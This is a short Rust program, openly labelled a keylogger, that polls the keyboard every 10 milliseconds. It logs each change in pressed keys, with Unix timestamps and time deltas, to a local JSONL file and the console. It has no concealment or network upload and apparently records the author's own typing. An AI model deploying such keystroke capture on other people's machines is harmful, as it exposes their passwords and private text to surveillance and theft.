use chrono::prelude::*;
use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;
use serde::Serialize;

#[derive(Serialize)]
struct Log {
    unix: i64,
    delta: i64,
    keyboard: Vec<String>,
}

/// Keylogger launch function
pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];
    let mut prev_date: DateTime<Local> = Local::now();
    let path = format!("{}.jsonl", path);

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    loop {
        let local: DateTime<Local> = Local::now();
        let unix = local.timestamp_millis();
        let delta = local.timestamp_millis() - prev_date.timestamp_millis();

        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            let log = serde_json::to_string(&Log {
                // time: local,
                unix,
                delta,
                keyboard: keys.iter().map(|key| key.to_string()).collect(),
            }).unwrap();

            println!("{}", log);

            writeln!(file, "{}", log).expect("Failed to write to file");

            prev_date = local;
        }
        prev_keys = keys;

        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

fn main() {
    run(String::from("/Users/ogatasoutachi/Documents/keylogger/src/test"));
}